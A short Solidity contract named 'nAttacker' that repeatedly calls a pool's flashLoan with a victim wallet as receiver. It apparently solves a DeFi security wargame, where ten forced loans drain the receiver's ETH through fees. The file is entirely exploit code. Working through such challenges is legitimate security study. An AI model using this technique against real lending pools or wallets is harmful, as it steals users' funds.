//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}

contract nAttacker {
    address private victim;

    constructor(address _pool) {
        victim = _pool;
    }

    function attack(address _wallet) external payable {
        for (uint256 i = 0 ; i < 10; i++) {
            IPool(victim).flashLoan(_wallet, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1 ether, "0x0");
        }
    }

}